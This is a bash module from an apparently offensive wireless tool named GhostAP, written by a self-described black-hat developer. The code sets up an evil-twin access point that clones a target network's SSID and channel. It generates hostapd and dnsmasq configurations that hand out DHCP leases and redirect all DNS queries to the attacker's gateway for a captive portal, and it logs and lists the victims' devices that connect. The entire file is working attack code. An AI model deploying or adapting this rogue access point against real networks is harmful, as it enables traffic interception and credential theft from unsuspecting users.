#!/usr/bin/env bash
# ======================================================================
#  GhostAP — Fake Access Point Module
#  Developer: ATHEX BLACK HAT
#  Version: 1.0.0
#  Description: Creates a spoofed AP with identical SSID to target
#               Runs hostapd + dnsmasq for DHCP/DNS captive portal support
# ======================================================================

# source dependencies
SCRIPT_DIR_FAKEAP="$(cd "$(dirname "${BASH_SOURCE[0]}")/.." && pwd)"

source "${SCRIPT_DIR_FAKEAP}/config/colors.sh" 2>/dev/null
source "${SCRIPT_DIR_FAKEAP}/config/settings.conf" 2>/dev/null
source "${SCRIPT_DIR_FAKEAP}/lib/logger.sh" 2>/dev/null
source "${SCRIPT_DIR_FAKEAP}/lib/interface.sh" 2>/dev/null

# ======================================================================
#  GLOBAL VARIABLES
# ======================================================================
HOSTAPD_PID=""
HOSTAPD_PID_RET=""
DNSMASQ_PID=""
DNSMASQ_PID_RET=""
FAKE_AP_ACTIVE=false
FAKE_AP_IFACE=""
FAKE_AP_SSID_RUNNING=""

# ======================================================================
#  GENERATE HOSTAPD CONFIGURATION
#  Args: $1 = SSID
#        $2 = channel
#        $3 = interface
#  Echoes: path to generated config file
# ======================================================================
generate_hostapd_conf() {
    local ssid="$1"
    local channel="$2"
    local iface="$3"
    local config_file="/tmp/ghostap_hostapd.conf"

    # check for template file
    local template="${SCRIPT_DIR_FAKEAP}/templates/hostapd_template.conf"

    if [[ -f "$template" ]]; then
        log_debug "Using hostapd template: $template"
        cp "$template" "$config_file"

        # replace placeholders
        sed -i "s/{{INTERFACE}}/${iface}/g" "$config_file" 2>/dev/null
        sed -i "s/{{SSID}}/${ssid}/g" "$config_file" 2>/dev/null
        sed -i "s/{{CHANNEL}}/${channel}/g" "$config_file" 2>/dev/null
        sed -i "s/{{DRIVER}}/${FAKE_AP_DRIVER:-nl80211}/g" "$config_file" 2>/dev/null
        sed -i "s/{{HW_MODE}}/${FAKE_AP_HW_MODE:-g}/g" "$config_file" 2>/dev/null
    else
        log_debug "No template found. Generating hostapd config manually..."

        cat > "$config_file" << HOSTAPDEOF
# GhostAP — hostapd configuration
# Generated: $(date)
# Developer: ATHEX BLACK HAT

interface=${iface}
driver=${FAKE_AP_DRIVER:-nl80211}
ssid=${ssid}
hw_mode=${FAKE_AP_HW_MODE:-g}
channel=${channel}
macaddr_acl=0
auth_algs=1
ignore_broadcast_ssid=${FAKE_AP_HIDE_SSID:-0}
wmm_enabled=${FAKE_AP_WMM_ENABLED:-1}

# Optional: enable WPA2 for realism (uncomment to use)
# wpa=2
# wpa_passphrase=GhostAP123
# wpa_key_mgmt=WPA-PSK
# wpa_pairwise=TKIP
# rsn_pairwise=CCMP
HOSTAPDEOF
    fi

    echo "$config_file"
}

# ======================================================================
#  GENERATE DNSMASQ CONFIGURATION
#  Args: $1 = interface
#  Echoes: path to generated config file
# ======================================================================
generate_dnsmasq_conf() {
    local iface="$1"
    local config_file="/tmp/ghostap_dnsmasq.conf"

    local template="${SCRIPT_DIR_FAKEAP}/templates/dnsmasq_template.conf"

    if [[ -f "$template" ]]; then
        log_debug "Using dnsmasq template: $template"
        cp "$template" "$config_file"

        sed -i "s/{{INTERFACE}}/${iface}/g" "$config_file" 2>/dev/null
        sed -i "s/{{GATEWAY}}/${DHCP_GATEWAY:-10.0.0.1}/g" "$config_file" 2>/dev/null
        sed -i "s/{{DHCP_START}}/${DHCP_RANGE_START:-10.0.0.50}/g" "$config_file" 2>/dev/null
        sed -i "s/{{DHCP_END}}/${DHCP_RANGE_END:-10.0.0.150}/g" "$config_file" 2>/dev/null
        sed -i "s/{{LEASE_TIME}}/${DHCP_LEASE_TIME:-12h}/g" "$config_file" 2>/dev/null
    else
        log_debug "No template found. Generating dnsmasq config manually..."

        cat > "$config_file" << DNSMASQEOF
# GhostAP — dnsmasq configuration
# Generated: $(date)
# Developer: ATHEX BLACK HAT

interface=${iface}
bind-interfaces

# DHCP Configuration
dhcp-range=${DHCP_RANGE_START:-10.0.0.50},${DHCP_RANGE_END:-10.0.0.150},${DHCP_LEASE_TIME:-12h}
dhcp-option=3,${DHCP_GATEWAY:-10.0.0.1}
dhcp-option=6,${DHCP_GATEWAY:-10.0.0.1}

# DNS Spoofing — redirect all queries to gateway (captive portal)
address=/#/${DHCP_GATEWAY:-10.0.0.1}

# Logging
log-queries
log-dhcp
log-facility=/tmp/ghostap_dnsmasq.log

# No external upstream DNS (forces captive portal)
no-resolv
DNSMASQEOF
    fi

    echo "$config_file"
}

# ======================================================================
#  SETUP FAKE AP INTERFACE
#  Brings up interface with gateway IP
#  Args: $1 = interface
# ======================================================================
setup_fake_ap_interface() {
    local iface="$1"
    local gateway="${DHCP_GATEWAY:-10.0.0.1}"
    local netmask="${DHCP_NETMASK:-255.255.255.0}"

    if [[ -z "$iface" ]]; then
        log_error "No interface specified for fake AP."
        return 1
    fi

    log_info "Configuring interface $iface..."

    # bring interface up
    ip link set "$iface" up 2>/dev/null

    # assign gateway IP
    ifconfig "$iface" "$gateway" netmask "$netmask" up 2>/dev/null

    # verify
    local assigned_ip
    assigned_ip=$(ifconfig "$iface" 2>/dev/null | grep -oP '(?<=inet )\d+\.\d+\.\d+\.\d+' | head -1)

    if [[ "$assigned_ip" == "$gateway" ]]; then
        log_success "Interface $iface configured: $gateway/$netmask"
        return 0
    else
        log_warn "Interface IP assignment may have failed. Got: ${assigned_ip:-none}"
        return 1
    fi
}

# ======================================================================
#  START FAKE ACCESS POINT
#  Args: $1 = target ESSID (to clone)
#        $2 = target channel
#        $3 = monitor interface
#  Sets: HOSTAPD_PID, HOSTAPD_PID_RET, DNSMASQ_PID, DNSMASQ_PID_RET
# ======================================================================
start_fake_ap() {
    local essid="$1"
    local channel="$2"
    local mon_iface="$3"

    # --- validation ---
    if [[ -z "$essid" ]]; then
        log_error "No ESSID specified for fake AP."
        return 1
    fi

    if [[ -z "$channel" ]]; then
        log_warn "No channel specified. Defaulting to 6."
        channel=6
    fi

    if [[ -z "$mon_iface" ]]; then
        log_error "No interface specified for fake AP."
        return 1
    fi

    FAKE_AP_SSID_RUNNING="$essid"
    FAKE_AP_IFACE="$mon_iface"

    # --- setup interface ---
    setup_fake_ap_interface "$mon_iface"

    # --- generate configs ---
    log_info "Generating hostapd configuration..."
    local hostapd_conf
    hostapd_conf=$(generate_hostapd_conf "$essid" "$channel" "$mon_iface")

    log_info "Generating dnsmasq configuration..."
    local dnsmasq_conf
    dnsmasq_conf=$(generate_dnsmasq_conf "$mon_iface")

    # --- kill any existing instances ---
    pkill -x "hostapd" 2>/dev/null
    pkill -x "dnsmasq" 2>/dev/null
    sleep 0.5

    # --- start dnsmasq first (DHCP/DNS) ---
    log_info "Starting dnsmasq (DHCP + DNS)..."
    dnsmasq -C "$dnsmasq_conf" &
    DNSMASQ_PID=$!
    sleep 1

    if ! kill -0 "$DNSMASQ_PID" 2>/dev/null; then
        log_error "dnsmasq failed to start."
        return 1
    fi
    log_success "dnsmasq running (PID: $DNSMASQ_PID)"
    export DNSMASQ_PID_RET="$DNSMASQ_PID"

    # --- start hostapd (AP) ---
    log_info "Starting hostapd — broadcasting as '${essid}'..."
    log_info "Channel: ${channel} | Interface: ${mon_iface}"

    if [[ "${SHOW_XTERM_WINDOWS:-true}" == "true" ]]; then
        xterm -T "GhostAP — Fake AP [${essid}]" \
              -geometry 90x20+300+350 \
              -fg "#00ccff" \
              -e "hostapd -d ${hostapd_conf}" &
        HOSTAPD_PID=$!
    else
        hostapd "$hostapd_conf" &>/dev/null &
        HOSTAPD_PID=$!
    fi

    sleep 2

    if ! kill -0 "$HOSTAPD_PID" 2>/dev/null; then
        log_error "hostapd failed to start."
        kill "$DNSMASQ_PID" 2>/dev/null
        return 1
    fi

    log_success "Fake AP broadcasting (PID: $HOSTAPD_PID)"
    export HOSTAPD_PID_RET="$HOSTAPD_PID"
    FAKE_AP_ACTIVE=true

    # --- summary ---
    echo ""
    echo -e "${GREEN}${BOLD}╔══════════════════════════════════════╗${NC}"
    echo -e "${GREEN}${BOLD}║       FAKE AP IS LIVE                ║${NC}"
    echo -e "${GREEN}${BOLD}╠══════════════════════════════════════╣${NC}"
    echo -e "${GREEN}${BOLD}║${NC}  SSID     : ${YELLOW}${essid}${GREEN}"
    echo -e "${GREEN}${BOLD}║${NC}  Channel  : ${YELLOW}${channel}${GREEN}"
    echo -e "${GREEN}${BOLD}║${NC}  Gateway  : ${YELLOW}${DHCP_GATEWAY:-10.0.0.1}${GREEN}"
    echo -e "${GREEN}${BOLD}║${NC}  DHCP     : ${YELLOW}${DHCP_RANGE_START:-10.0.0.50}-${DHCP_RANGE_END:-10.0.0.150}${GREEN}"
    echo -e "${GREEN}${BOLD}╚══════════════════════════════════════╝${NC}"
    echo ""

    return 0
}

# ======================================================================
#  STOP FAKE ACCESS POINT
# ======================================================================
stop_fake_ap() {
    log_info "Stopping fake access point..."

    # stop hostapd
    if [[ -n "$HOSTAPD_PID" ]]; then
        if kill_process_safe "$HOSTAPD_PID" "hostapd"; then
            log_success "hostapd stopped."
        fi
        HOSTAPD_PID=""
    fi

    # kill any stray hostapd
    if pgrep -x "hostapd" &>/dev/null; then
        pkill -x "hostapd" 2>/dev/null
        sleep 0.3
        pkill -9 -x "hostapd" 2>/dev/null
    fi

    # stop dnsmasq
    if [[ -n "$DNSMASQ_PID" ]]; then
        if kill_process_safe "$DNSMASQ_PID" "dnsmasq"; then
            log_success "dnsmasq stopped."
        fi
        DNSMASQ_PID=""
    fi

    # kill any stray dnsmasq
    if pgrep -x "dnsmasq" &>/dev/null; then
        pkill -x "dnsmasq" 2>/dev/null
        sleep 0.3
        pkill -9 -x "dnsmasq" 2>/dev/null
    fi

    # bring interface down
    if [[ -n "$FAKE_AP_IFACE" ]]; then
        ip addr flush dev "$FAKE_AP_IFACE" 2>/dev/null
    fi

    # clean config files
    rm -f /tmp/ghostap_hostapd.conf 2>/dev/null
    rm -f /tmp/ghostap_dnsmasq.conf 2>/dev/null
    rm -f /tmp/ghostap_dnsmasq.log 2>/dev/null

    FAKE_AP_ACTIVE=false
    FAKE_AP_SSID_RUNNING=""
    export HOSTAPD_PID_RET=""
    export DNSMASQ_PID_RET=""

    log_success "Fake AP fully stopped."
}

# ======================================================================
#  CHECK FAKE AP STATUS
# ======================================================================
is_fake_ap_running() {
    if [[ -n "$HOSTAPD_PID" ]] && kill -0 "$HOSTAPD_PID" 2>/dev/null; then
        return 0
    fi
    return 1
}

# ======================================================================
#  GET CONNECTED CLIENTS
#  Parses dnsmasq leases or hostapd station list
# ======================================================================
get_connected_clients() {
    local iface="${1:-$FAKE_AP_IFACE}"

    echo ""
    echo -e "${CYAN}═══ Connected Clients ═══${NC}"

    # method 1: check dnsmasq leases
    local lease_file="/var/lib/misc/dnsmasq.leases"
    if [[ -f "$lease_file" ]] && [[ -s "$lease_file" ]]; then
        echo ""
        printf "  ${WHITE}%-18s %-16s %s${NC}\n" "MAC" "IP" "Hostname"
        printf "  ${GRAY}%-18s %-16s %s${NC}\n" "───" "──" "────────"
        while IFS=' ' read -r timestamp mac ip hostname _; do
            printf "  ${GREEN}%-18s${NC} ${YELLOW}%-16s${NC} ${GRAY}%s${NC}\n" "$mac" "$ip" "${hostname:-*}"
        done < "$lease_file"
    fi

    # method 2: check hostapd station list
    if command -v hostapd_cli &>/dev/null; then
        local stations
        stations=$(hostapd_cli -i "$iface" all_sta 2>/dev/null | grep -c "STA ")
        if [[ "$stations" -gt 0 ]]; then
            echo -e "  ${GRAY}hostapd reports ${stations} station(s)${NC}"
        fi
    fi

    # method 3: check ARP table
    local arp_entries
    arp_entries=$(arp -i "$iface" -a 2>/dev/null | grep -v "incomplete" | wc -l)
    if [[ "$arp_entries" -gt 0 ]]; then
        echo -e "  ${GRAY}ARP: ${arp_entries} entry/entries${NC}"
    fi

    if [[ ! -f "$lease_file" ]] || [[ ! -s "$lease_file" ]]; then
        echo -e "  ${YELLOW}No clients connected yet.${NC}"
    fi

    echo ""
}

# ======================================================================
#  GET FAKE AP PROCESS INFO
# ======================================================================
get_fake_ap_info() {
    if ! is_fake_ap_running; then
        echo -e "${YELLOW}Fake AP not running.${NC}"
        return 1
    fi

    local hostapd_cpu hostapd_mem dnsmasq_cpu dnsmasq_mem

    hostapd_cpu=$(ps -p "$HOSTAPD_PID" -o %cpu --no-headers 2>/dev/null | xargs)
    hostapd_mem=$(ps -p "$HOSTAPD_PID" -o %mem --no-headers 2>/dev/null | xargs)

    if [[ -n "$DNSMASQ_PID" ]] && kill -0 "$DNSMASQ_PID" 2>/dev/null; then
        dnsmasq_cpu=$(ps -p "$DNSMASQ_PID" -o %cpu --no-headers 2>/dev/null | xargs)
        dnsmasq_mem=$(ps -p "$DNSMASQ_PID" -o %mem --no-headers 2>/dev/null | xargs)
    fi

    echo ""
    echo -e "${CYAN}═══ Fake AP Status ═══${NC}"
    echo -e "  ${GRAY}SSID     : ${YELLOW}${FAKE_AP_SSID_RUNNING}${NC}"
    echo -e "  ${GRAY}Iface    : ${WHITE}${FAKE_AP_IFACE}${NC}"
    echo -e "  ${GRAY}Gateway  : ${WHITE}${DHCP_GATEWAY:-10.0.0.1}${NC}"
    echo ""
    echo -e "  ${GRAY}hostapd PID : ${WHITE}${HOSTAPD_PID}${NC}  CPU: ${hostapd_cpu:-?}%  MEM: ${hostapd_mem:-?}%"
    echo -e "  ${GRAY}dnsmasq PID : ${WHITE}${DNSMASQ_PID:-N/A}${NC}  CPU: ${dnsmasq_cpu:-?}%  MEM: ${dnsmasq_mem:-?}%"
    echo ""
}

# ======================================================================
#  END OF FAKE AP MODULE
# ======================================================================